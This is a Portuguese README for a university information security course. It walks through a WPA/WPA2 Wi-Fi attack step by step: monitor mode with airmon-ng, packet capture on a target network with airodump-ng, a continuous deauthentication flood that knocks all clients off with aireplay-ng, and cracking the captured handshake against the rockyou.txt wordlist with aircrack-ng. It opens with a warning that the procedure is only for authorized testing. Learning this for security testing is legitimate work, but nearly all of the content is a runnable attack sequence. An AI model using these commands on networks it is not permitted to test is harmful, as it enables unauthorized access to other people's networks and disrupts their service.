# <p align="center">Disciplina de Segurança da Informação do Instituto Federal do Piaui</p>
# <p align="center">ATAQUE WPA CAPTURANDO HANDSHAKE COM FORÇA BRUTA
</p>

---

## <p style="color:red" align="justify">Atenção: Tentar realizar esse procimento em uma rede não autorizada resulta-se em crime. Este procedimento deve ser usado apenas para fins educacionais e testes de segurança em redes que você tem permissão para acessar.</p>

## Vídeo Tutorial [Youtube](https://youtu.be/z6vb1Fl77cg)

## <p align="justify">Este tutorial mostra o passo a passo para capturar o handshake WPA e tentar quebrar a senha da rede usando um dicionário de senhas.</p>
---

### Comandos a serem seguidos
- [ ] **ip address**
    - Comando para identificar e analisar as interfaces de redes
- [ ] **iwconfig**
    - Comando específico para identificar e analisar interfaces sem fio
- [ ] **sudo airmon-ng check kill**
    - Comando serve para parar processos que atrapalham o modo monitor da placa Wi-Fi.
- [ ] **sudo airmon-ng start wlan0**
    - Comando serve para colocar a placa Wi-Fi em modo monitor.
- [ ] **iwconfig**
    - somente para conferir se está em modo monitor
- [ ] **sudo airodump-ng wlan0mon**
    - comando serve para iniciar a captura de pacotes Wi-Fi com a interface em modo monitor
- [ ] **sudo airodump-ng wlan0mon -c 1 --bssid xx:xx:xx:xx:xx:xx**
    - comando serve focar em uma rede específica e capturar o Handshake WPA (se alguém se conectar), pacotes de dados e informações dos dispositivos conectados
- [ ] **sudo airodump-ng -w arquivocaptura -c 1 --bssid AA:83:89:E8:B6:CA wlan0mon** (permanecer em execução)
    - Esse comando foca exclusivamente na rede Wi-Fi alvo e salva os pacotes capturados

- [ ] **sudo aireplay-ng --deauth 0 -a xx:xx:xx:xx:xx:xx wlan0mon**
    - é usado para forçar a desconexão de todos os clientes conectados a uma rede Wi-Fi, com o objetivo de capturar o handshake WPA/WPA2 quando eles se reconectarem.

- [ ] **sudo aircrack-ng arquivocaptura-01.cap -w ~/rockyou.txt**
    - Lê o arquivo .cap onde está o handshake WPA/WPA2 e testa cada senha do arquivo rockyou.txt e compara com os dados do handshake se a senha correta estiver na lista será exibida na tela. Fim!
